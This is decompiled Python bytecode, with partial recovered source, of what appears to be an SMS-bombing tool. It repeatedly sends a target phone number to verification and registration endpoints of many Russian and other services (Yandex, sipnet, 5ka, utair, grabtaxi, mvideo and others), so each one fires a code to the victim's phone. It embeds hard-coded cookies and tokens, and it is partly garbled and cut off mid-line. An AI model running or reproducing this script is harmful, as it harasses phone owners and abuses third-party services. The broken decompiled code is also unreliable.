             1124  BUILD_CONST_KEY_MAP_9     9 
             1126  LOAD_CONST               ('data', 'headers')
             1128  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
             1130  STORE_FAST               'rYT'

 L.  82      1132  LOAD_FAST                'rYT'
             1134  LOAD_ATTR                status_code
             1136  LOAD_CONST               200
             1138  COMPARE_OP               ==
         1140_1142  POP_JUMP_IF_FALSE  1160  'to 1160'

 L.  83      1144  LOAD_GLOBAL              print
             1146  LOAD_GLOBAL              colored
             1148  LOAD_GLOBAL              m1
             1150  LOAD_STR                 'green'
             1152  CALL_FUNCTION_2       2  '2 positional arguments'
             1154  CALL_FUNCTION_1       1  '1 positional argument'
             1156  POP_TOP          
             1158  JUMP_FORWARD       1174  'to 1174'
           1160_0  COME_FROM          1140  '1140'

 L.  85      1160  LOAD_GLOBAL              print
             1162  LOAD_GLOBAL              colored
             1164  LOAD_GLOBAL              m2
             1166  LOAD_STR                 'red'
             1168  CALL_FUNCTION_2       2  '2 positional arguments'
             1170  CALL_FUNCTION_1       1  '1 positional argument'
             1172  POP_TOP          
           1174_0  COME_FROM          1158  '1158'

 L.  86      1174  LOAD_GLOBAL              requests
             1176  LOAD_ATTR                get
             1178  LOAD_STR                 'https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper?oper=9&phone='
             1180  LOAD_GLOBAL              phone
             1182  BINARY_ADD       
             1184  LOAD_STR                 '9'
             1186  LOAD_GLOBAL              phone
             1188  LOAD_CONST               ('oper', 'phone')
             1190  BUILD_CONST_KEY_MAP_2     2 
             1192  LOAD_STR                 'gzip, deflate, br'
             1194  LOAD_STR                 'en-US,en;q=0.5'
             1196  LOAD_STR                 'keep-alive'
             1198  LOAD_STR                 'register.sipnet.ru'
             1200  LOAD_STR                 'https://www.sipnet.ru'
             1202  LOAD_STR                 'https://www.sipnet.ru/tarify-ip-telefonii'
             1204  LOAD_STR                 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
             1206  LOAD_CONST               ('Accept-Encoding', 'Accept-Language', 'Connection', 'Host', 'Origin', 'Referer', 'User-Agent')
             1208  BUILD_CONST_KEY_MAP_7     7 
             1210  LOAD_CONST               ('data', 'headers')
             1212  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
             1214  STORE_FAST               'rSN'

 L.  87      1216  LOAD_FAST                'rSN'
             1218  LOAD_ATTR                status_code
             1220  LOAD_CONST               200
             1222  COMPARE_OP               ==
         1224_1226  POP_JUMP_IF_FALSE  1244  'to 1244'

 L.  88      1228  LOAD_GLOBAL              print
             1230  LOAD_GLOBAL              colored
             1232  LOAD_GLOBAL              m1
             1234  LOAD_STR                 'green'
             1236  CALL_FUNCTION_2       2  '2 positional arguments'
             1238  CALL_FUNCTION_1       1  '1 positional argument'
             1240  POP_TOP          
             1242  JUMP_FORWARD       1258  'to 1258'
           1244_0  COME_FROM          1224  '1224'

 L.  90      1244  LOAD_GLOBAL              print
             1246  LOAD_GLOBAL              colored
             1248  LOAD_GLOBAL              m2
             1250  LOAD_STR                 'red'
             1252  CALL_FUNCTION_2       2  '2 positional arguments'
             1254  CALL_FUNCTION_1       1  '1 positional argument'
             1256  POP_TOP          
           1258_0  COME_FROM          1242  '1242'

 L.  91      1258  LOAD_GLOBAL              requests
             1260  LOAD_ATTR                post
             1262  LOAD_STR                 'https://my.5ka.ru/api/v1/services/phones/add'
             1264  LOAD_STR                 'number'
             1266  LOAD_GLOBAL              phone
             1268  BUILD_MAP_1           1 
             1270  LOAD_STR                 'gzip, deflate, br'
             1272  LOAD_STR                 'en-US,en;q=0.5'
             1274  LOAD_STR                 'keep-alive'
             1276  LOAD_STR                 ''
             1278  LOAD_STR                 'my.5ka.ru'
             1280  LOAD_STR                 'https://my.5ka.ru/forgot_password'
             1282  LOAD_STR                 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
             1284  LOAD_STR                 'Tokenbb71fd472873b8f0dc1edfc0c24ecfd478e83a43'
             1286  LOAD_CONST               ('Accept-Encoding', 'Accept-Language', 'Connection', 'Cookie', 'Host', 'Referer', 'User-Agent', 'X-Authorization')
             1288  BUILD_CONST_KEY_MAP_8     8 
             1290  LOAD_CONST               ('data', 'headers')
             1292  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
             1294  STORE_FAST               'rPK'

 L.  92      1296  LOAD_FAST                'rPK'
             1298  LOAD_ATTR                status_code
             1300  LOAD_CONST               200
             1302  COMPARE_OP               ==
         1304_1306  POP_JUMP_IF_FALSE  1324  'to 1324'

 L.  93      1308  LOAD_GLOBAL              print
             1310  LOAD_GLOBAL              colored
             1312  LOAD_GLOBAL              m1
             1314  LOAD_STR                 'green'
             1316  CALL_FUNCTION_2       2  '2 positional arguments'
             1318  CALL_FUNCTION_1       1  '1 positional argument'
             1320  POP_TOP          
             1322  JUMP_FORWARD       1338  'to 1338'
           1324_0  COME_FROM          1304  '1304'

 L.  95      1324  LOAD_GLOBAL              print
             1326  LOAD_GLOBAL              colored
             1328  LOAD_GLOBAL              m2
             1330  LOAD_STR                 'red'
             1332  CALL_FUNCTION_2       2  '2 positional arguments'
             1334  CALL_FUNCTION_1       1  '1 positional argument'
             1336  POP_TOP          
           1338_0  COME_FROM          1322  '1322'

 L.  96      1338  LOAD_GLOBAL              requests
             1340  LOAD_ATTR                post
             1342  LOAD_STR                 'https://passport.yandex.com/registration-validations/phone-confirm-code-submit'
             1344  LOAD_STR                 '443094351f0679bc68dfd50025907a9058'
             1346  LOAD_STR                 '64ecaba01cd2cbcccbe81da19571eda854002267:1553547854103'
             1348  LOAD_STR                 'huihu76t7gi'
             1350  LOAD_STR                 'adfsdhi76giuy'
             1352  LOAD_GLOBAL              phone
             1354  LOAD_CONST               ('track_id', 'csrf_token', 'password', 'login', 'number')
             1356  BUILD_CONST_KEY_MAP_5     5 
             1358  LOAD_STR                 'gzip, deflate, br'
             1360  LOAD_STR                 'en-US,en;q=0.5'
             1362  LOAD_STR                 'keep-alive'
             1364  LOAD_STR                 '_ym_d=1553558585;_ym_isad=2;_ym_uid=15535585858461222;_ym_visorc_784657=w;_ym_wasSynced=%7B%22time%22%3A1553558576111%2C%22params%22%3A%7B%22eu%22%3A1%7D%2C%22bkParams%22%3A%7B%7D%7D;gdpr=0;mda=0;yandexuid=462756331553547768;'
             1366  LOAD_STR                 '1'
             1368  LOAD_STR                 'passport.yandex.com'
             1370  LOAD_STR                 'https://passport.yandex.com/registration?mode=register'
             1372  LOAD_STR                 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
             1374  LOAD_STR                 'XMLHttpRequest'
             1376  LOAD_CONST               ('Accept-Encoding', 'Accept-Language', 'Connection', 'Cookie', 'DNT', 'Host', 'Referer', 'User-Agent', 'X-Requested-With')
             1378  BUILD_CONST_KEY_MAP_9     9 
             1380  LOAD_CONST               ('data', 'headers')
             1382  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
             1384  STORE_FAST               'rYP'

 L.  97      1386  LOAD_FAST                'rYP'
             1388  LOAD_ATTR                status_code
             1390  LOAD_CONST               200
             1392  COMPARE_OP               ==
         1394_1396  POP_JUMP_IF_FALSE  1414  'to 1414'

 L.  98      1398  LOAD_GLOBAL              print
             1400  LOAD_GLOBAL              colored
             1402  LOAD_GLOBAL              m1
             1404  LOAD_STR                 'green'
             1406  CALL_FUNCTION_2       2  '2 positional arguments'
             1408  CALL_FUNCTION_1       1  '1 positional argument'
             1410  POP_TOP          
             1412  JUMP_FORWARD       2136  'to 2136'
           1414_0  COME_FROM          1394  '1394'

 L. 100      1414  LOAD_GLOBAL              print
             1416  LOAD_GLOBAL              colored
             1418  LOAD_GLOBAL              m2
             1420  LOAD_STR                 'red'
             1422  CALL_FUNCTION_2       2  '2 positional arguments'
             1424  CALL_FUNCTION_1       1  '1 positional argument'
             1426  POP_TOP          
         1428_1430  JUMP_FORWARD       2136  'to 2136'
           1432_0  COME_FROM            22  '22'

 L. 102      1432  LOAD_GLOBAL              requests
             1434  LOAD_ATTR                post
             1436  LOAD_STR                 'https://api.fex.net/api/v1/auth/scaffold'
             1438  LOAD_STR                 'phone'
             1440  LOAD_GLOBAL              phone
             1442  LOAD_CONST               1
             1444  LOAD_CONST               None
             1446  BUILD_SLICE_2         2 
             1448  BINARY_SUBSCR    
             1450  BUILD_MAP_1           1 
             1452  LOAD_STR                 'gzip, deflate, br'
             1454  LOAD_STR                 'en-US,en;q=0.5'
             1456  LOAD_STR                 'kepp-alive'
             1458  LOAD_STR                 '_ga=GA1.2.1166716131.1550503357;_gid=GA1.2.807690535.1550503357;alt-register-code=406701;cid=6659361518671092072;G_ENABLED_IDPS=goole;'
             1460  LOAD_STR                 'api.fex.net'
             1462  LOAD_STR                 'https://fex.net'
             1464  LOAD_STR                 'https://fex.net/login'
             1466  LOAD_STR                 'Trailers'
             1468  LOAD_STR                 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
             1470  LOAD_CONST               ('Accept-Encoding', 'Accept-Language', 'Connection', 'Cookie', 'Host', 'Origin', 'Referer', 'TE', 'User-Agent')
             1472  BUILD_CONST_KEY_MAP_9     9 
             1474  LOAD_CONST               ('data', 'headers')
             1476  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
             1478  STORE_FAST               'rFN'

 L. 103      1480  LOAD_FAST                'rFN'
             1482  LOAD_ATTR                status_code
             1484  LOAD_CONST               200
             1486  COMPARE_OP               ==
         1488_1490  POP_JUMP_IF_FALSE  1508  'to 1508'

 L. 104      1492  LOAD_GLOBAL              print
             1494  LOAD_GLOBAL              colored
             1496  LOAD_GLOBAL              m1
             1498  LOAD_STR                 'green'
             1500  CALL_FUNCTION_2       2  '2 positional arguments'
             1502  CALL_FUNCTION_1       1  '1 positional argument'
             1504  POP_TOP          
             1506  JUMP_FORWARD       1522  'to 1522'
           1508_0  COME_FROM          1488  '1488'

 L. 106      1508  LOAD_GLOBAL              print
             1510  LOAD_GLOBAL              colored
             1512  LOAD_GLOBAL              m2
             1514  LOAD_STR                 'red'
             1516  CALL_FUNCTION_2       2  '2 positional arguments'
             1518  CALL_FUNCTION_1       1  '1 positional argument'
             1520  POP_TOP          
           1522_0  COME_FROM          1506  '1506'

 L. 107      1522  LOAD_GLOBAL              requests
             1524  LOAD_ATTR                post
             1526  LOAD_STR                 'https://api-production.viasat.ru/api/v1/auth_codes'
             1528  LOAD_STR                 'msisdn'
             1530  LOAD_GLOBAL              phone
             1532  BUILD_MAP_1           1 
             1534  LOAD_STR                 'gzip, deflate, br'
             1536  LOAD_STR                 'ru'
             1538  LOAD_STR                 'keep-alive'
             1540  LOAD_STR                 'api-production.viasat.ru'
             1542  LOAD_STR                 'https://vipplay.ru'
             1544  LOAD_STR                 'https://vipplay.ru/'
             1546  LOAD_STR                 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
             1548  LOAD_STR                 'XMLHttpRequest'
             1550  LOAD_CONST               ('Accept-Encoding', 'Accept-Language', 'Connection', 'Host', 'Origin', 'Referer', 'User-Agent', 'X-Requested-With')
             1552  BUILD_CONST_KEY_MAP_8     8 
             1554  LOAD_CONST               ('data', 'headers')
             1556  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
             1558  STORE_FAST               'rVI'

 L. 108      1560  LOAD_FAST                'rVI'
             1562  LOAD_ATTR                status_code
             1564  LOAD_CONST               204
             1566  COMPARE_OP               ==
         1568_1570  POP_JUMP_IF_FALSE  1588  'to 1588'

 L. 109      1572  LOAD_GLOBAL              print
             1574  LOAD_GLOBAL              colored
             1576  LOAD_GLOBAL              m1
             1578  LOAD_STR                 'green'
             1580  CALL_FUNCTION_2       2  '2 positional arguments'
             1582  CALL_FUNCTION_1       1  '1 positional argument'
             1584  POP_TOP          
             1586  JUMP_FORWARD       1602  'to 1602'
           1588_0  COME_FROM          1568  '1568'

 L. 111      1588  LOAD_GLOBAL              print
             1590  LOAD_GLOBAL              colored
             1592  LOAD_GLOBAL              m2
             1594  LOAD_STR                 'red'
             1596  CALL_FUNCTION_2       2  '2 positional arguments'
             1598  CALL_FUNCTION_1       1  '1 positional argument'
             1600  POP_TOP          
           1602_0  COME_FROM          1586  '1586'

 L. 112      1602  LOAD_GLOBAL              requests
             1604  LOAD_METHOD              session
             1606  CALL_METHOD_0         0  '0 positional arguments'
             1608  STORE_FAST               'clDV'

 L. 113      1610  LOAD_FAST                'clDV'
             1612  LOAD_METHOD              get
             1614  LOAD_STR                 'https://drugvokrug.ru/siteActions/processSms.htm'
             1616  CALL_METHOD_1         1  '1 positional argument'
             1618  POP_TOP          

 L. 114      1620  LOAD_GLOBAL              requests
             1622  LOAD_ATTR                post
             1624  LOAD_STR                 'https://drugvokrug.ru/siteActions/processSms.htm'
             1626  LOAD_STR                 'cell'
             1628  LOAD_GLOBAL              phone
             1630  LOAD_CONST               1
             1632  LOAD_CONST               None
             1634  BUILD_SLICE_2         2 
             1636  BINARY_SUBSCR    
             1638  BUILD_MAP_1           1 
             1640  LOAD_STR                 'en-US,en;q=0.5'
             1642  LOAD_STR                 'keep-alive'
             1644  LOAD_STR                 'JSESSIONID='
             1646  LOAD_FAST                'clDV'
             1648  LOAD_ATTR                cookies
             1650  LOAD_STR                 'JSESSIONID'
             1652  BINARY_SUBSCR    
             1654  BINARY_ADD       
             1656  LOAD_STR                 ';'
             1658  BINARY_ADD       
             1660  LOAD_STR                 'drugvokrug.ru'
             1662  LOAD_STR                 'https://drugvokrug.ru/'
             1664  LOAD_STR                 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
             1666  LOAD_STR                 'XMLHttpRequest'
             1668  LOAD_CONST               ('Accept-Language', 'Connection', 'Cookie', 'Host', 'Referer', 'User-Agent', 'X-Requested-With')
             1670  BUILD_CONST_KEY_MAP_7     7 
             1672  LOAD_CONST               ('data', 'headers')
             1674  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
             1676  STORE_FAST               'rDV'

 L. 115      1678  LOAD_FAST                'rDV'
             1680  LOAD_ATTR                status_code
             1682  LOAD_CONST               200
             1684  COMPARE_OP               ==
         1686_1688  POP_JUMP_IF_FALSE  1706  'to 1706'

 L. 116      1690  LOAD_GLOBAL              print
             1692  LOAD_GLOBAL              colored
             1694  LOAD_GLOBAL              m1
             1696  LOAD_STR                 'green'
             1698  CALL_FUNCTION_2       2  '2 positional arguments'
             1700  CALL_FUNCTION_1       1  '1 positional argument'
             1702  POP_TOP          
             1704  JUMP_FORWARD       1720  'to 1720'
           1706_0  COME_FROM          1686  '1686'

 L. 118      1706  LOAD_GLOBAL              print
             1708  LOAD_GLOBAL              colored
             1710  LOAD_GLOBAL              m2
             1712  LOAD_STR                 'red'
             1714  CALL_FUNCTION_2       2  '2 positional arguments'
             1716  CALL_FUNCTION_1       1  '1 positional argument'
             1718  POP_TOP          
           1720_0  COME_FROM          1704  '1704'

 L. 119      1720  LOAD_GLOBAL              requests
             1722  LOAD_ATTR                post
             1724  LOAD_STR                 'https://b.utair.ru/api/v1/login/'
             1726  LOAD_STR                 'login'
             1728  LOAD_GLOBAL              phone
             1730  BUILD_MAP_1           1 
             1732  LOAD_STR                 'gzip, deflate, br'
             1734  LOAD_STR                 'en-US,en;q=0.5'
             1736  LOAD_STR                 'keep-alive'
             1738  LOAD_STR                 'b.utair.ru'
             1740  LOAD_STR                 'https://www.utair.ru'
             1742  LOAD_STR                 'https://www.utair.ru/'
             1744  LOAD_CONST               ('Accept-Encoding', 'Accept-Language', 'Connection', 'Host', 'origin', 'Referer')
             1746  BUILD_CONST_KEY_MAP_6     6 
             1748  LOAD_CONST               ('data', 'headers')
             1750  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
             1752  STORE_FAST               'rUT'

 L. 120      1754  LOAD_FAST                'rUT'
             1756  LOAD_ATTR                status_code
             1758  LOAD_CONST               200
             1760  COMPARE_OP               ==
         1762_1764  POP_JUMP_IF_FALSE  1782  'to 1782'

 L. 121      1766  LOAD_GLOBAL              print
             1768  LOAD_GLOBAL              colored
             1770  LOAD_GLOBAL              m1
             1772  LOAD_STR                 'green'
             1774  CALL_FUNCTION_2       2  '2 positional arguments'
             1776  CALL_FUNCTION_1       1  '1 positional argument'
             1778  POP_TOP          
             1780  JUMP_FORWARD       1796  'to 1796'
           1782_0  COME_FROM          1762  '1762'

 L. 123      1782  LOAD_GLOBAL              print
             1784  LOAD_GLOBAL              colored
             1786  LOAD_GLOBAL              m2
             1788  LOAD_STR                 'red'
             1790  CALL_FUNCTION_2       2  '2 positional arguments'
             1792  CALL_FUNCTION_1       1  '1 positional argument'
             1794  POP_TOP          
           1796_0  COME_FROM          1780  '1780'

 L. 124      1796  LOAD_GLOBAL              requests
             1798  LOAD_ATTR                post
             1800  LOAD_STR                 'https://p.grabtaxi.com/api/passenger/v2/profiles/register'
             1802  LOAD_GLOBAL              phone
             1804  LOAD_CONST               1
             1806  LOAD_CONST               None
             1808  BUILD_SLICE_2         2 
             1810  BINARY_SUBSCR    
             1812  LOAD_STR                 'ID'
             1814  LOAD_STR                 'Alexey'
             1816  LOAD_STR                 'alexey173949@gmail.com'
             1818  LOAD_STR                 '*'
             1820  LOAD_CONST               ('phoneNumber', 'countryCode', 'name', 'email', 'deviceToken')
             1822  BUILD_CONST_KEY_MAP_5     5 
             1824  LOAD_STR                 'User-Agent'
             1826  LOAD_STR                 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
             1828  BUILD_MAP_1           1 
             1830  LOAD_CONST               ('data', 'headers')
             1832  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
             1834  STORE_FAST               'rGRAB'

 L. 125      1836  LOAD_FAST                'rGRAB'
             1838  LOAD_ATTR                status_code
             1840  LOAD_CONST               200
             1842  COMPARE_OP               ==
         1844_1846  POP_JUMP_IF_FALSE  1864  'to 1864'

 L. 126      1848  LOAD_GLOBAL              print
             1850  LOAD_GLOBAL              colored
             1852  LOAD_GLOBAL              m1
             1854  LOAD_STR                 'green'
             1856  CALL_FUNCTION_2       2  '2 positional arguments'
             1858  CALL_FUNCTION_1       1  '1 positional argument'
             1860  POP_TOP          
             1862  JUMP_FORWARD       1878  'to 1878'
           1864_0  COME_FROM          1844  '1844'

 L. 128      1864  LOAD_GLOBAL              print
             1866  LOAD_GLOBAL              colored
             1868  LOAD_GLOBAL              m2
             1870  LOAD_STR                 'red'
             1872  CALL_FUNCTION_2       2  '2 positional arguments'
             1874  CALL_FUNCTION_1       1  '1 positional argument'
             1876  POP_TOP          
           1878_0  COME_FROM          1862  '1862'

 L. 129      1878  LOAD_GLOBAL              requests
             1880  LOAD_ATTR                post
             1882  LOAD_STR                 'https://m.taxi.yandex.ru/3.0/auth/'
             1884  LOAD_STR                 '08f84247220c36d308c802736dcc58af'
             1886  LOAD_GLOBAL              phone
             1888  LOAD_CONST               ('id', 'phone')
             1890  BUILD_CONST_KEY_MAP_2     2 
             1892  LOAD_STR                 'gzip, deflate, br'
             1894  LOAD_STR                 'ru-RU'
             1896  LOAD_STR                 'keep-alive'
             1898  LOAD_STR                 '_id=7a7cd323a887d891192610c9c3406349;_ym_d=1552824752;_ym_isad=2;_ym_uid=1552824752982775742;_ym_wasSynced=%7B%22time%22%3A1552850261519%2C%22params%22%3A%7B%22eu%22%3A1%7D%2C%22bkParams%22%3A%7B%7D%7D;fuid01=5c8d8dd2118e8d4a.ZzYLCgUwHZG-G2j-tu141V5dkl9qQ8_w0KW_80u0cW9AGB2dB9ood4s6uivmMu_w8emgBKjrEUMIkrS2G3D6jJJi3BdcD7hmw_YEqPADgSvNO2Lp8AwxQAvZSWDTjyFR;gdpr=1;i=y+LF5v3Aclb2XpLoSvwahQquBla32PYbdEAnObsu/DfHtJ+rCJqo6VQMq9tJtCjYpoRTzU8L9SvPnR57dqJ1qjrBRzs=;mda=0;yandexuid=536383211552780201;yp=1584316206.yrts.1552780206#1584316206.yrtsi.1552780206;'
             1900  LOAD_STR                 'm.taxi.yandex.ru'
             1902  LOAD_STR                 'https://m.taxi.yandex.ru/'
             1904  LOAD_STR                 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0'
             1906  LOAD_STR                 'XMLHttpRequest'
             1908  LOAD_STR                 'https://m.taxi.yandex.ru/'
             1910  LOAD_CONST               ('Accept-Encoding', 'Accept-Language', 'Connection', 'Cookie', 'Host', 'Referer', 'User-Agent', 'X-Requested-With', 'x-requested-uri')
             1912  BUILD_CONST_KEY_MAP_9     9 
             1914  LOAD_CONST               ('data', 'headers')
             1916  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
             1918  STORE_FAST               'rYT'

 L. 130      1920  LOAD_FAST                'rYT'
             1922  LOAD_ATTR                status_code
             1924  LOAD_CONST               200
             1926  COMPARE_OP               ==
         1928_1930  POP_JUMP_IF_FALSE  1948  'to 1948'

 L. 131      1932  LOAD_GLOBAL              print
             1934  LOAD_GLOBAL              colored
             1936  LOAD_GLOBAL              m1
             1938  LOAD_STR                 'green'
             1940  CALL_FUNCTION_2       2  '2 positional arguments'
             1942  CALL_FUNCTION_1       1  '1 positional argument'
             1944  POP_TOP          
             1946  JUMP_FORWARD       1962  'to 1962'
           1948_0  COME_FROM          1928  '1928'

 L. 133      1948  LOAD_GLOBAL              print
             1950  LOAD_GLOBAL              colored
             1952  LOAD_GLOBAL              m2
             1954  LOAD_STR                 'red'
             1956  CALL_FUNCTION_2       2  '2 positional arguments'
             1958  CALL_FUNCTION_1       1  '1 positional argument'
             1960  POP_TOP          
           1962_0  COME_FROM          1946  '1946'

 L. 134      1962  LOAD_GLOBAL              requests
             1964  LOAD_ATTR                get
             1966  LOAD_STR                 'https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper?oper=9&phone='
             1968  LOAD_GLOBAL              phone
             1970  BINARY_ADD       
             1972  LOAD_STR                 '9'
             1974  LOAD_GLOBAL              phone
             1976  LOAD_CONST               ('oper', 'phone')
             1978  BUILD_CONST_KEY_MAP_2     2 
             1980  LOAD_STR                 'gzip, deflate, br'
             1982  LOAD_STR                 'en-US,en;q=0.5'
             1984  LOAD_STR                 'keep-alive'
             1986  LOAD_STR                 'register.sipnet.ru'
             1988  LOAD_STR                 'https://www.sipnet.ru'
             1990  LOAD_STR                 'https://www.sipnet.ru/tarify-ip-telefonii'
             1992  LOAD_STR                 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
             1994  LOAD_CONST               ('Accept-Encoding', 'Accept-Language', 'Connection', 'Host', 'Origin', 'Referer', 'User-Agent')
             1996  BUILD_CONST_KEY_MAP_7     7 
             1998  LOAD_CONST               ('data', 'headers')
             2000  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
             2002  STORE_FAST               'rSN'

 L. 135      2004  LOAD_FAST                'rSN'
             2006  LOAD_ATTR                status_code
             2008  LOAD_CONST               200
             2010  COMPARE_OP               ==
         2012_2014  POP_JUMP_IF_FALSE  2032  'to 2032'

 L. 136      2016  LOAD_GLOBAL              print
             2018  LOAD_GLOBAL              colored
             2020  LOAD_GLOBAL              m1
             2022  LOAD_STR                 'green'
             2024  CALL_FUNCTION_2       2  '2 positional arguments'
             2026  CALL_FUNCTION_1       1  '1 positional argument'
             2028  POP_TOP          
             2030  JUMP_FORWARD       2046  'to 2046'
           2032_0  COME_FROM          2012  '2012'

 L. 138      2032  LOAD_GLOBAL              print
             2034  LOAD_GLOBAL              colored
             2036  LOAD_GLOBAL              m2
             2038  LOAD_STR                 'red'
             2040  CALL_FUNCTION_2       2  '2 positional arguments'
             2042  CALL_FUNCTION_1       1  '1 positional argument'
             2044  POP_TOP          
           2046_0  COME_FROM          2030  '2030'

 L. 139      2046  LOAD_GLOBAL              requests
             2048  LOAD_ATTR                post
             2050  LOAD_STR                 'https://passport.yandex.com/registration-validations/phone-confirm-code-submit'
             2052  LOAD_STR                 '443094351f0679bc68dfd50025907a9058'
             2054  LOAD_STR                 '64ecaba01cd2cbcccbe81da19571eda854002267:1553547854103'
             2056  LOAD_STR                 'jbkhgvjhgb578a'
             2058  LOAD_STR                 'adfsdhi76giuy'
             2060  LOAD_GLOBAL              phone
             2062  LOAD_CONST               ('track_id', 'csrf_token', 'password', 'login', 'number')
             2064  BUILD_CONST_KEY_MAP_5     5 
             2066  LOAD_STR                 'gzip, deflate, br'
             2068  LOAD_STR                 'en-US,en;q=0.5'
             2070  LOAD_STR                 'keep-alive'
             2072  LOAD_STR                 '_ym_d=1553558585;_ym_isad=2;_ym_uid=15535585858461222;_ym_visorc_784657=w;_ym_wasSynced=%7B%22time%22%3A1553558576111%2C%22params%22%3A%7B%22eu%22%3A1%7D%2C%22bkParams%22%3A%7B%7D%7D;gdpr=0;mda=0;yandexuid=462756331553547768;'
             2074  LOAD_STR                 '1'
             2076  LOAD_STR                 'passport.yandex.com'
             2078  LOAD_STR                 'https://passport.yandex.com/registration?mode=register'
             2080  LOAD_STR                 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
             2082  LOAD_STR                 'XMLHttpRequest'
             2084  LOAD_CONST               ('Accept-Encoding', 'Accept-Language', 'Connection', 'Cookie', 'DNT', 'Host', 'Referer', 'User-Agent', 'X-Requested-With')
             2086  BUILD_CONST_KEY_MAP_9     9 
             2088  LOAD_CONST               ('data', 'headers')
             2090  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
             2092  STORE_FAST               'rYP'

 L. 140      2094  LOAD_FAST                'rYP'
             2096  LOAD_ATTR                status_code
             2098  LOAD_CONST               200
             2100  COMPARE_OP               ==
         2102_2104  POP_JUMP_IF_FALSE  2122  'to 2122'

 L. 141      2106  LOAD_GLOBAL              print
             2108  LOAD_GLOBAL              colored
             2110  LOAD_GLOBAL              m1
             2112  LOAD_STR                 'green'
             2114  CALL_FUNCTION_2       2  '2 positional arguments'
             2116  CALL_FUNCTION_1       1  '1 positional argument'
           2118_0  COME_FROM          1412  '1412'
             2118  POP_TOP          
             2120  JUMP_FORWARD       2136  'to 2136'
           2122_0  COME_FROM          2102  '2102'

 L. 143      2122  LOAD_GLOBAL              print
             2124  LOAD_GLOBAL              colored
             2126  LOAD_GLOBAL              m2
             2128  LOAD_STR                 'red'
             2130  CALL_FUNCTION_2       2  '2 positional arguments'
             2132  CALL_FUNCTION_1       1  '1 positional argument'
             2134  POP_TOP          
           2136_0  COME_FROM          2120  '2120'
           2136_1  COME_FROM          1428  '1428'
             2136  POP_BLOCK        
             2138  JUMP_BACK             4  'to 4'
           2140_0  COME_FROM_EXCEPT      4  '4'

 L. 144      2140  DUP_TOP          
             2142  LOAD_GLOBAL              Exception
             2144  COMPARE_OP               exception-match
         2146_2148  POP_JUMP_IF_FALSE  2182  'to 2182'
             2150  POP_TOP          
             2152  POP_TOP          
             2154  POP_TOP          

 L. 145      2156  LOAD_GLOBAL              print
             2158  LOAD_STR                 'Error. Check your internet connection'
             2160  CALL_FUNCTION_1       1  '1 positional argument'
             2162  POP_TOP          

 L. 146      2164  LOAD_GLOBAL              print
             2166  LOAD_STR                 'Restart...'
             2168  CALL_FUNCTION_1       1  '1 positional argument'
             2170  POP_TOP          

 L. 147      2172  LOAD_GLOBAL              main
             2174  CALL_FUNCTION_0       0  '0 positional arguments'
             2176  POP_TOP          
             2178  POP_EXCEPT       
             2180  JUMP_BACK             4  'to 4'
           2182_0  COME_FROM          2146  '2146'
             2182  END_FINALLY      
             2184  JUMP_BACK             4  'to 4'
             2186  POP_BLOCK        
           2188_0  COME_FROM_LOOP        0  '0'

Parse error at or near `POP_TOP' instruction at offset 2118


a = True

def mv():
    while True:
        cl = requests.session()
        cl.get'https://www.mvideo.ru/sitebuilder/components/phoneVerification/sendSmsCode.json.jsp'
        newcook = '__SourceTracker=google__organic;_dc_gtm_UA-1873769-1=1;_fbp=1548089553260;_ga=1118344361;_gat_owox37=1;_gcl_au=397168788;_gid=289341971;_ym_d=1547846842;_ym_isad=2;_ym_uid=1547846842874071677;_ym_visorc_25907066=w;_ym_visorc_338158=b;BIGipServeratg-ps-prod_tcp80=' + cl.cookies['BIGipServeratg-ps-prod_tcp80'] + ';bIPs=' + cl.cookies['bIPs'] + ';CACHE_INDICATOR=' + cl.cookies['CACHE_INDICATOR'] + ';COMPARISON_INDICATOR=' + cl.cookies['COMPARISON_INDICATOR'] + ';cto_idcpy=f13ff313-a794-4213-8136-452b7cb46ab8;cto_lwid=c4fb55af-e800-4aa6-a020-7797a2510be0;deviceType=desktop;flacktory=' + cl.cookies['flacktory'] + ';Flocktory_Global_ID=4a848e72-a240-47d3-aaeffa8ae67bdd2b;flocktory-uuid=b8cd369d-ffc6-45cc-9fe9-0e51948ef7c9-8;JSESSIONID' + cl.cookies['JSESSIONID'] + ';MVID_CITY_ID=' + cl.cookies['MVID_CITY_ID'] + ';MVID_GUEST_ID=' + cl.cookies['MVID_GUEST_ID'] + ';MVID_VIEWED_PRODUCTS=' + ';tmr_detect=0|1548089556738;TS0102af22=' + cl.cookies['TS0102af22'] + ';TS0102af22_77=08e3680a10ab28000e39f4bb39e0cf339a7e5f1189c45465b0c27e2b7ed92d9de1494f0bb365d7d804e5e784f65b7d7e083af2c9c08238003acc11662a964627e64bb241d9f9b7f874bc8b75d4b16fb4d42278a017963461daec9960021cce1f17628d24438a180081db36f48e1a81db;TS01189d65=' + cl.cookies['TS01189d65'] + 